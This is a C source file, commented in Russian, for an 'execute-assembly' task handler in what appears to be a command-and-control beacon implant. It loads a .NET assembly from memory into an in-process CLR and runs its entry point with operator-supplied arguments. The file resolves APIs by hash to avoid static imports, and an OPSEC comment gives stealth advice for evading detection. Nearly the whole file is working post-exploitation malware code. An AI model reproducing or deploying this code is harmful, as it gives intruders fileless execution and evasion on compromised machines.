// execute-assembly: in-process CLR hosting + загрузка .NET-сборки из памяти.
//
// Payload (KV):
//   bytes  pe   — байты сборки (PE32/PE32+ managed)
//   utf8   args — командная строка для Main(string[]) (опционально)
//
// Алгоритм:
//   1) LoadLibraryA("mscoree.dll") + GetProcAddress("CLRCreateInstance")
//   2) ICLRMetaHost::GetRuntime(L"v4.0.30319") → ICLRRuntimeInfo
//   3) ICLRRuntimeInfo::GetInterface(CLSID_CLRRuntimeHost / ICLRRuntimeHost) — НЕ используем,
//      берём legacy ICorRuntimeHost для доступа к AppDomain (нужен для Load_3 с byte[])
//   4) ICorRuntimeHost::Start, GetDefaultDomain → IUnknown → _AppDomain
//   5) _AppDomain::Load_3(SAFEARRAY of byte) → _Assembly
//   6) _Assembly::get_EntryPoint → _MethodInfo
//   7) _MethodInfo::Invoke_3(VT_EMPTY, SAFEARRAY of VARIANT{ string[] }) — вызывает Main
//
// Stdout сборки в текущем варианте НЕ перехватывается (потребует SetStdHandle +
// AppDomain Console.SetOut перед вызовом). Возврат — успех/ошибка с HRESULT.
//
// OPSEC: загрузка mscoree.dll и mscorlib демаскирует процесс как .NET host.
// Для скрытности рекомендуется применять spawnto + execute-assembly в дочернем
// процессе либо отдельный CLR-host через UnmanagedExports.

#include "../core/beacon.h"

#include <ole2.h>
#include <oaidl.h>

// ---- ручное описание COM-интерфейсов (избегаем metahost.h/mscoree.h) -------

typedef struct ICLRMetaHost            ICLRMetaHost;
typedef struct ICLRRuntimeInfo         ICLRRuntimeInfo;
typedef struct ICorRuntimeHost         ICorRuntimeHost;
typedef struct mscorlib_AppDomain      mscorlib_AppDomain;
typedef struct mscorlib_Assembly       mscorlib_Assembly;
typedef struct mscorlib_MethodInfo     mscorlib_MethodInfo;

typedef HRESULT (STDAPICALLTYPE *pCLRCreateInstance)(REFCLSID, REFIID, LPVOID*);

// CLSID_CLRMetaHost           = {9280188D-0E8E-4867-B30C-7FA83884E8DE}
// IID_ICLRMetaHost            = {D332DB9E-B9B3-4125-8207-A14884F53216}
// IID_ICLRRuntimeInfo         = {BD39D1D2-BA2F-486A-89B0-B4B0CB466891}
// CLSID_CorRuntimeHost        = {CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}
// IID_ICorRuntimeHost         = {CB2F6722-AB3A-11D2-9C40-00C04FA30A3E}
// IID__AppDomain (mscorlib)   = {05F696DC-2B29-3663-AD8B-C4389CF2A713}

static const GUID CLSID_CLRMetaHost_g =
    { 0x9280188D, 0x0E8E, 0x4867, { 0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE } };
static const GUID IID_ICLRMetaHost_g =
    { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
static const GUID IID_ICLRRuntimeInfo_g =
    { 0xBD39D1D2, 0xBA2F, 0x486A, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
static const GUID CLSID_CorRuntimeHost_g =
    { 0xCB2F6723, 0xAB3A, 0x11D2, { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };
static const GUID IID_ICorRuntimeHost_g =
    { 0xCB2F6722, 0xAB3A, 0x11D2, { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };
static const GUID IID_AppDomain_g =
    { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };

// vtable-описания: достаточно first-N методов из IUnknown + используемые.

typedef struct ICLRMetaHostVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICLRMetaHost*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICLRMetaHost*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICLRMetaHost*);
    HRESULT (STDMETHODCALLTYPE *GetRuntime)(ICLRMetaHost*, LPCWSTR, REFIID, LPVOID*);
    // ... другие методы не нужны
} ICLRMetaHostVtbl;
struct ICLRMetaHost { ICLRMetaHostVtbl* lpVtbl; };

typedef struct ICLRRuntimeInfoVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICLRRuntimeInfo*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICLRRuntimeInfo*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICLRRuntimeInfo*);
    HRESULT (STDMETHODCALLTYPE *GetVersionString)(ICLRRuntimeInfo*, LPWSTR, DWORD*);
    HRESULT (STDMETHODCALLTYPE *GetRuntimeDirectory)(ICLRRuntimeInfo*, LPWSTR, DWORD*);
    HRESULT (STDMETHODCALLTYPE *IsLoaded)(ICLRRuntimeInfo*, HANDLE, BOOL*);
    HRESULT (STDMETHODCALLTYPE *LoadErrorString)(ICLRRuntimeInfo*, UINT, LPWSTR, DWORD*, LONG);
    HRESULT (STDMETHODCALLTYPE *LoadLibrary)(ICLRRuntimeInfo*, LPCWSTR, HMODULE*);
    HRESULT (STDMETHODCALLTYPE *GetProcAddress)(ICLRRuntimeInfo*, LPCSTR, LPVOID*);
    HRESULT (STDMETHODCALLTYPE *GetInterface)(ICLRRuntimeInfo*, REFCLSID, REFIID, LPVOID*);
} ICLRRuntimeInfoVtbl;
struct ICLRRuntimeInfo { ICLRRuntimeInfoVtbl* lpVtbl; };

typedef struct ICorRuntimeHostVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICorRuntimeHost*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICorRuntimeHost*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICorRuntimeHost*);
    HRESULT (STDMETHODCALLTYPE *CreateLogicalThreadState)(ICorRuntimeHost*);
    HRESULT (STDMETHODCALLTYPE *DeleteLogicalThreadState)(ICorRuntimeHost*);
    HRESULT (STDMETHODCALLTYPE *SwitchInLogicalThreadState)(ICorRuntimeHost*, DWORD*);
    HRESULT (STDMETHODCALLTYPE *SwitchOutLogicalThreadState)(ICorRuntimeHost*, DWORD**);
    HRESULT (STDMETHODCALLTYPE *LocksHeldByLogicalThread)(ICorRuntimeHost*, DWORD*);
    HRESULT (STDMETHODCALLTYPE *MapFile)(ICorRuntimeHost*, HANDLE, HMODULE*);
    HRESULT (STDMETHODCALLTYPE *GetConfiguration)(ICorRuntimeHost*, void**);
    HRESULT (STDMETHODCALLTYPE *Start)(ICorRuntimeHost*);
    HRESULT (STDMETHODCALLTYPE *Stop)(ICorRuntimeHost*);
    HRESULT (STDMETHODCALLTYPE *CreateDomain)(ICorRuntimeHost*, LPCWSTR, IUnknown*, IUnknown**);
    HRESULT (STDMETHODCALLTYPE *GetDefaultDomain)(ICorRuntimeHost*, IUnknown**);
    // ... остальное не нужно
} ICorRuntimeHostVtbl;
struct ICorRuntimeHost { ICorRuntimeHostVtbl* lpVtbl; };

// _AppDomain (часть mscorlib type library) — нас интересует Load_3.
// Полная сигнатура из mscorlib.tlh:
//   HRESULT Load_3([in] SAFEARRAY(unsigned char)* rawAssembly,
//                  [out, retval] _Assembly** ppAssembly);
// Порядок методов после IDispatch — стандартный COM dual.
typedef struct mscorlib_AppDomainVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(mscorlib_AppDomain*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(mscorlib_AppDomain*);
    ULONG   (STDMETHODCALLTYPE *Release)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfoCount)(mscorlib_AppDomain*, UINT*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfo)(mscorlib_AppDomain*, UINT, LCID, void**);
    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)(mscorlib_AppDomain*, REFIID, LPOLESTR*, UINT, LCID, DISPID*);
    HRESULT (STDMETHODCALLTYPE *Invoke)(mscorlib_AppDomain*, DISPID, REFIID, LCID, WORD, DISPPARAMS*, VARIANT*, EXCEPINFO*, UINT*);
    HRESULT (STDMETHODCALLTYPE *get_ToString)(mscorlib_AppDomain*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *Equals)(mscorlib_AppDomain*, VARIANT, VARIANT_BOOL*);
    HRESULT (STDMETHODCALLTYPE *GetHashCode)(mscorlib_AppDomain*, long*);
    HRESULT (STDMETHODCALLTYPE *GetType)(mscorlib_AppDomain*, void**);
    HRESULT (STDMETHODCALLTYPE *InitializeLifetimeService)(mscorlib_AppDomain*, VARIANT*);
    HRESULT (STDMETHODCALLTYPE *GetLifetimeService)(mscorlib_AppDomain*, VARIANT*);
    HRESULT (STDMETHODCALLTYPE *get_Evidence)(mscorlib_AppDomain*, void**);
    HRESULT (STDMETHODCALLTYPE *add_DomainUnload)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *remove_DomainUnload)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *add_AssemblyLoad)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *remove_AssemblyLoad)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *add_ProcessExit)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *remove_ProcessExit)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *add_TypeResolve)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *remove_TypeResolve)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *add_ResourceResolve)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *remove_ResourceResolve)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *add_AssemblyResolve)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *remove_AssemblyResolve)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *add_UnhandledException)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *remove_UnhandledException)(mscorlib_AppDomain*, void*);
    HRESULT (STDMETHODCALLTYPE *DefineDynamicAssembly)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *DefineDynamicAssembly_2)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *DefineDynamicAssembly_3)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *DefineDynamicAssembly_4)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *DefineDynamicAssembly_5)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *DefineDynamicAssembly_6)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *DefineDynamicAssembly_7)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *DefineDynamicAssembly_8)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *DefineDynamicAssembly_9)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *CreateInstance)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *CreateInstanceFrom)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *CreateInstance_2)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *CreateInstanceFrom_2)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *CreateInstance_3)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *CreateInstanceFrom_3)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *Load)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *Load_2)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *Load_3)(mscorlib_AppDomain*, SAFEARRAY*, mscorlib_Assembly**);
    HRESULT (STDMETHODCALLTYPE *Load_4)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *Load_5)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *Load_6)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *Load_7)(mscorlib_AppDomain*);
    HRESULT (STDMETHODCALLTYPE *ExecuteAssembly)(mscorlib_AppDomain*, BSTR, void*, SAFEARRAY*, long*);
    HRESULT (STDMETHODCALLTYPE *ExecuteAssembly_2)(mscorlib_AppDomain*, BSTR, long*);
    HRESULT (STDMETHODCALLTYPE *ExecuteAssembly_3)(mscorlib_AppDomain*, BSTR, void*, SAFEARRAY*, void*, void*, long*);
    // ... остальное не нужно
} mscorlib_AppDomainVtbl;
struct mscorlib_AppDomain { mscorlib_AppDomainVtbl* lpVtbl; };

typedef struct mscorlib_AssemblyVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(mscorlib_Assembly*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(mscorlib_Assembly*);
    ULONG   (STDMETHODCALLTYPE *Release)(mscorlib_Assembly*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfoCount)(mscorlib_Assembly*, UINT*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfo)(mscorlib_Assembly*, UINT, LCID, void**);
    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)(mscorlib_Assembly*, REFIID, LPOLESTR*, UINT, LCID, DISPID*);
    HRESULT (STDMETHODCALLTYPE *Invoke)(mscorlib_Assembly*, DISPID, REFIID, LCID, WORD, DISPPARAMS*, VARIANT*, EXCEPINFO*, UINT*);
    HRESULT (STDMETHODCALLTYPE *get_ToString)(mscorlib_Assembly*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *Equals)(mscorlib_Assembly*, VARIANT, VARIANT_BOOL*);
    HRESULT (STDMETHODCALLTYPE *GetHashCode)(mscorlib_Assembly*, long*);
    HRESULT (STDMETHODCALLTYPE *GetType)(mscorlib_Assembly*, void**);
    HRESULT (STDMETHODCALLTYPE *get_CodeBase)(mscorlib_Assembly*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *get_EscapedCodeBase)(mscorlib_Assembly*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *GetName)(mscorlib_Assembly*, void**);
    HRESULT (STDMETHODCALLTYPE *GetName_2)(mscorlib_Assembly*, VARIANT_BOOL, void**);
    HRESULT (STDMETHODCALLTYPE *get_FullName)(mscorlib_Assembly*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *get_EntryPoint)(mscorlib_Assembly*, mscorlib_MethodInfo**);
    // ...
} mscorlib_AssemblyVtbl;
struct mscorlib_Assembly { mscorlib_AssemblyVtbl* lpVtbl; };

typedef struct mscorlib_MethodInfoVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(mscorlib_MethodInfo*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(mscorlib_MethodInfo*);
    ULONG   (STDMETHODCALLTYPE *Release)(mscorlib_MethodInfo*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfoCount)(mscorlib_MethodInfo*, UINT*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfo)(mscorlib_MethodInfo*, UINT, LCID, void**);
    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)(mscorlib_MethodInfo*, REFIID, LPOLESTR*, UINT, LCID, DISPID*);
    HRESULT (STDMETHODCALLTYPE *Invoke)(mscorlib_MethodInfo*, DISPID, REFIID, LCID, WORD, DISPPARAMS*, VARIANT*, EXCEPINFO*, UINT*);
    HRESULT (STDMETHODCALLTYPE *get_ToString)(mscorlib_MethodInfo*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *Equals)(mscorlib_MethodInfo*, VARIANT, VARIANT_BOOL*);
    HRESULT (STDMETHODCALLTYPE *GetHashCode)(mscorlib_MethodInfo*, long*);
    HRESULT (STDMETHODCALLTYPE *GetType)(mscorlib_MethodInfo*, void**);
    HRESULT (STDMETHODCALLTYPE *get_MemberType)(mscorlib_MethodInfo*, void*);
    HRESULT (STDMETHODCALLTYPE *get_name)(mscorlib_MethodInfo*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *get_DeclaringType)(mscorlib_MethodInfo*, void**);
    HRESULT (STDMETHODCALLTYPE *get_ReflectedType)(mscorlib_MethodInfo*, void**);
    HRESULT (STDMETHODCALLTYPE *GetCustomAttributes)(mscorlib_MethodInfo*, void*, VARIANT_BOOL, SAFEARRAY**);
    HRESULT (STDMETHODCALLTYPE *GetCustomAttributes_2)(mscorlib_MethodInfo*, VARIANT_BOOL, SAFEARRAY**);
    HRESULT (STDMETHODCALLTYPE *IsDefined)(mscorlib_MethodInfo*, void*, VARIANT_BOOL, VARIANT_BOOL*);
    HRESULT (STDMETHODCALLTYPE *Invoke_2)(mscorlib_MethodInfo*);
    HRESULT (STDMETHODCALLTYPE *Invoke_3)(mscorlib_MethodInfo*, VARIANT, SAFEARRAY*, VARIANT*);
} mscorlib_MethodInfoVtbl;
struct mscorlib_MethodInfo { mscorlib_MethodInfoVtbl* lpVtbl; };

// ---- утилиты -------------------------------------------------------------

static void wout(const char* m) { out_write(m, rt_strlen(m)); }

static void wout_hex32(uint32_t v) {
    char buf[11]; buf[0] = '0'; buf[1] = 'x';
    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < 8; ++i) buf[2 + i] = hex[(v >> ((7 - i) * 4)) & 0xF];
    buf[10] = '\n';
    out_write(buf, 11);
}

// Ленивый резолвер OleAut32 (через api_resolve чтобы не тянуть статический импорт).
typedef SAFEARRAY* (WINAPI *pSafeArrayCreate)(VARTYPE, UINT, SAFEARRAYBOUND*);
typedef HRESULT    (WINAPI *pSafeArrayPutElement)(SAFEARRAY*, LONG*, void*);
typedef HRESULT    (WINAPI *pSafeArrayDestroy)(SAFEARRAY*);
typedef BSTR       (WINAPI *pSysAllocString)(const OLECHAR*);
typedef void       (WINAPI *pSysFreeString)(BSTR);
typedef HRESULT    (WINAPI *pCoInitializeEx)(LPVOID, DWORD);

typedef struct OleApi {
    pSafeArrayCreate     SafeArrayCreate;
    pSafeArrayPutElement SafeArrayPutElement;
    pSafeArrayDestroy    SafeArrayDestroy;
    pSysAllocString      SysAllocString;
    pSysFreeString       SysFreeString;
    pCoInitializeEx      CoInitializeEx;
} OleApi;

static int resolve_ole(OleApi* a) {
    rt_memset(a, 0, sizeof(*a));
    uint32_t h_oa = api_hash_w(L"oleaut32.dll");
    uint32_t h_ole = api_hash_w(L"ole32.dll");
    // Принудительная подгрузка (могут быть не загружены в beacon-процессе).
    LoadLibraryA("oleaut32.dll");
    LoadLibraryA("ole32.dll");
    a->SafeArrayCreate     = (pSafeArrayCreate)    api_resolve(h_oa,  api_hash("SafeArrayCreate"));
    a->SafeArrayPutElement = (pSafeArrayPutElement)api_resolve(h_oa,  api_hash("SafeArrayPutElement"));
    a->SafeArrayDestroy    = (pSafeArrayDestroy)   api_resolve(h_oa,  api_hash("SafeArrayDestroy"));
    a->SysAllocString      = (pSysAllocString)     api_resolve(h_oa,  api_hash("SysAllocString"));
    a->SysFreeString       = (pSysFreeString)      api_resolve(h_oa,  api_hash("SysFreeString"));
    a->CoInitializeEx      = (pCoInitializeEx)     api_resolve(h_ole, api_hash("CoInitializeEx"));
    return a->SafeArrayCreate && a->SafeArrayPutElement && a->SafeArrayDestroy &&
           a->SysAllocString  && a->SysFreeString      && a->CoInitializeEx;
}

// utf8 → UTF-16 BSTR через SysAllocString. Возвращает NULL при пустой строке.
static BSTR utf8_to_bstr(const OleApi* a, const char* utf8, uint32_t len) {
    if (!utf8 || !len) return NULL;
    int wn = MultiByteToWideChar(CP_UTF8, 0, utf8, (int)len, NULL, 0);
    if (wn <= 0) return NULL;
    wchar_t* w = (wchar_t*)bmalloc((size_t)(wn + 1) * sizeof(wchar_t));
    if (!w) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, utf8, (int)len, w, wn);
    w[wn] = 0;
    BSTR b = a->SysAllocString(w);
    bfree(w);
    return b;
}

// Делит командную строку на argv по пробелам с учётом кавычек. Возвращает
// SAFEARRAY of BSTR (VT_BSTR) — то, что ожидает Main(string[]).
static SAFEARRAY* build_args_safearray(const OleApi* a, const char* args, uint32_t args_len) {
    // Считаем токены.
    uint32_t tokens = 0;
    int in_tok = 0, in_q = 0;
    for (uint32_t i = 0; i < args_len; ++i) {
        char c = args[i];
        if (c == '"') { in_q = !in_q; if (!in_tok) { in_tok = 1; ++tokens; } continue; }
        if (!in_q && (c == ' ' || c == '\t')) { in_tok = 0; continue; }
        if (!in_tok) { in_tok = 1; ++tokens; }
    }

    SAFEARRAYBOUND sab; sab.lLbound = 0; sab.cElements = tokens;
    SAFEARRAY* sa = a->SafeArrayCreate(VT_BSTR, 1, &sab);
    if (!sa) return NULL;
    if (!tokens) return sa;

    char tmp[1024];
    LONG idx = 0;
    in_tok = 0; in_q = 0;
    uint32_t tlen = 0;
    for (uint32_t i = 0; i <= args_len; ++i) {
        char c = (i < args_len) ? args[i] : 0;
        int is_sep = !in_q && (c == ' ' || c == '\t' || c == 0);
        if (c == '"') { in_q = !in_q; if (!in_tok) in_tok = 1; continue; }
        if (is_sep) {
            if (in_tok) {
                BSTR b = utf8_to_bstr(a, tmp, tlen);
                if (b) {
                    a->SafeArrayPutElement(sa, &idx, b);
                    a->SysFreeString(b); // PutElement делает копию
                }
                ++idx; tlen = 0; in_tok = 0;
            }
            continue;
        }
        if (!in_tok) in_tok = 1;
        if (tlen < sizeof(tmp) - 1) tmp[tlen++] = c;
    }
    return sa;
}

// SAFEARRAY of byte для Load_3.
static SAFEARRAY* build_pe_safearray(const OleApi* a, const uint8_t* pe, uint32_t pe_len) {
    SAFEARRAYBOUND sab; sab.lLbound = 0; sab.cElements = pe_len;
    SAFEARRAY* sa = a->SafeArrayCreate(VT_UI1, 1, &sab);
    if (!sa) return NULL;
    // Прямой доступ к буферу: SafeArrayPutElement по байту слишком медленно.
    // Эквивалент SafeArrayAccessData — вызов через GetProcAddress.
    typedef HRESULT (WINAPI *pSafeArrayAccessData)(SAFEARRAY*, void**);
    typedef HRESULT (WINAPI *pSafeArrayUnaccessData)(SAFEARRAY*);
    static pSafeArrayAccessData   sad = NULL;
    static pSafeArrayUnaccessData sud = NULL;
    if (!sad) sad = (pSafeArrayAccessData)
        api_resolve(api_hash_w(L"oleaut32.dll"), api_hash("SafeArrayAccessData"));
    if (!sud) sud = (pSafeArrayUnaccessData)
        api_resolve(api_hash_w(L"oleaut32.dll"), api_hash("SafeArrayUnaccessData"));
    if (sad && sud) {
        void* dst = NULL;
        if (sad(sa, &dst) >= 0 && dst) {
            rt_memcpy(dst, pe, pe_len);
            sud(sa);
            return sa;
        }
    }
    // Фоллбэк (медленный): побайтно.
    for (uint32_t i = 0; i < pe_len; ++i) {
        LONG ix = (LONG)i;
        a->SafeArrayPutElement(sa, &ix, (void*)&pe[i]);
    }
    return sa;
}

// ---- основной обработчик -------------------------------------------------

void cmd_execute_assembly(const BeaconTask* t) {
    if (!t || !t->pay) { wout("execasm: empty task\n"); return; }

    const uint8_t* pe = NULL; uint32_t pe_len = 0;
    if (!kv_find(t->pay, t->pay_len, "pe", &pe, &pe_len) || !pe || !pe_len) {
        wout("execasm: missing 'pe' bytes\n"); return;
    }
    const uint8_t* args_b = NULL; uint32_t args_len = 0;
    kv_find(t->pay, t->pay_len, "args", &args_b, &args_len);
    const char* args = (const char*)args_b;

    OleApi ole;
    if (!resolve_ole(&ole)) { wout("execasm: oleaut32 resolve failed\n"); return; }

    HMODULE mscoree = LoadLibraryA("mscoree.dll");
    if (!mscoree) { wout("execasm: LoadLibrary(mscoree.dll) failed\n"); return; }

    pCLRCreateInstance CLRCreateInstance =
        (pCLRCreateInstance)GetProcAddress(mscoree, "CLRCreateInstance");
    if (!CLRCreateInstance) { wout("execasm: CLRCreateInstance not found\n"); return; }

    // STA подходит для большинства консольных PE.
    ole.CoInitializeEx(NULL, 0x2 /*COINIT_APARTMENTTHREADED*/);

    ICLRMetaHost* meta = NULL;
    HRESULT hr = CLRCreateInstance(&CLSID_CLRMetaHost_g, &IID_ICLRMetaHost_g, (LPVOID*)&meta);
    if (hr < 0 || !meta) { wout("execasm: CLRCreateInstance hr="); wout_hex32((uint32_t)hr); return; }

    ICLRRuntimeInfo* rti = NULL;
    hr = meta->lpVtbl->GetRuntime(meta, L"v4.0.30319", &IID_ICLRRuntimeInfo_g, (LPVOID*)&rti);
    if (hr < 0 || !rti) {
        meta->lpVtbl->Release(meta);
        wout("execasm: GetRuntime hr="); wout_hex32((uint32_t)hr); return;
    }

    ICorRuntimeHost* host = NULL;
    hr = rti->lpVtbl->GetInterface(rti, &CLSID_CorRuntimeHost_g, &IID_ICorRuntimeHost_g, (LPVOID*)&host);
    if (hr < 0 || !host) {
        rti->lpVtbl->Release(rti); meta->lpVtbl->Release(meta);
        wout("execasm: GetInterface(CorRuntimeHost) hr="); wout_hex32((uint32_t)hr); return;
    }

    hr = host->lpVtbl->Start(host);
    if (hr < 0) {
        host->lpVtbl->Release(host); rti->lpVtbl->Release(rti); meta->lpVtbl->Release(meta);
        wout("execasm: Start hr="); wout_hex32((uint32_t)hr); return;
    }

    IUnknown* dom_unk = NULL;
    hr = host->lpVtbl->GetDefaultDomain(host, &dom_unk);
    if (hr < 0 || !dom_unk) {
        host->lpVtbl->Release(host); rti->lpVtbl->Release(rti); meta->lpVtbl->Release(meta);
        wout("execasm: GetDefaultDomain hr="); wout_hex32((uint32_t)hr); return;
    }

    mscorlib_AppDomain* dom = NULL;
    hr = dom_unk->lpVtbl->QueryInterface(dom_unk, &IID_AppDomain_g, (void**)&dom);
    dom_unk->lpVtbl->Release(dom_unk);
    if (hr < 0 || !dom) {
        host->lpVtbl->Release(host); rti->lpVtbl->Release(rti); meta->lpVtbl->Release(meta);
        wout("execasm: QI(_AppDomain) hr="); wout_hex32((uint32_t)hr); return;
    }

    SAFEARRAY* sa_pe = build_pe_safearray(&ole, pe, pe_len);
    if (!sa_pe) {
        dom->lpVtbl->Release(dom); host->lpVtbl->Release(host);
        rti->lpVtbl->Release(rti); meta->lpVtbl->Release(meta);
        wout("execasm: SafeArray(pe) failed\n"); return;
    }

    mscorlib_Assembly* asm_ = NULL;
    hr = dom->lpVtbl->Load_3(dom, sa_pe, &asm_);
    ole.SafeArrayDestroy(sa_pe);
    if (hr < 0 || !asm_) {
        dom->lpVtbl->Release(dom); host->lpVtbl->Release(host);
        rti->lpVtbl->Release(rti); meta->lpVtbl->Release(meta);
        wout("execasm: Load_3 hr="); wout_hex32((uint32_t)hr); return;
    }

    mscorlib_MethodInfo* mi = NULL;
    hr = asm_->lpVtbl->get_EntryPoint(asm_, &mi);
    if (hr < 0 || !mi) {
        asm_->lpVtbl->Release(asm_); dom->lpVtbl->Release(dom);
        host->lpVtbl->Release(host); rti->lpVtbl->Release(rti); meta->lpVtbl->Release(meta);
        wout("execasm: get_EntryPoint hr="); wout_hex32((uint32_t)hr); return;
    }

    // args[] в один-единственный VARIANT (VT_ARRAY|VT_BSTR), упакованный
    // в SAFEARRAY of VARIANT длиной 1 — это и есть параметр Main(string[]).
    SAFEARRAY* sa_args = build_args_safearray(&ole, args, args_len);

    SAFEARRAYBOUND psab; psab.lLbound = 0; psab.cElements = 1;
    SAFEARRAY* params = ole.SafeArrayCreate(VT_VARIANT, 1, &psab);
    VARIANT v_args; rt_memset(&v_args, 0, sizeof(v_args));
    v_args.vt = VT_ARRAY | VT_BSTR;
    v_args.parray = sa_args;
    LONG ix = 0;
    ole.SafeArrayPutElement(params, &ix, &v_args);

    VARIANT v_inst; rt_memset(&v_inst, 0, sizeof(v_inst)); v_inst.vt = VT_NULL;
    VARIANT v_ret;  rt_memset(&v_ret,  0, sizeof(v_ret));

    hr = mi->lpVtbl->Invoke_3(mi, v_inst, params, &v_ret);

    ole.SafeArrayDestroy(params);
    if (sa_args) ole.SafeArrayDestroy(sa_args);

    mi->lpVtbl->Release(mi);
    asm_->lpVtbl->Release(asm_);
    dom->lpVtbl->Release(dom);
    // host НЕ останавливаем (Stop) — CLR в процессе, повторные вызовы дешевле.
    host->lpVtbl->Release(host);
    rti->lpVtbl->Release(rti);
    meta->lpVtbl->Release(meta);

    if (hr < 0) { wout("execasm: Invoke_3 hr="); wout_hex32((uint32_t)hr); return; }
    wout("execasm: assembly executed\n");
}
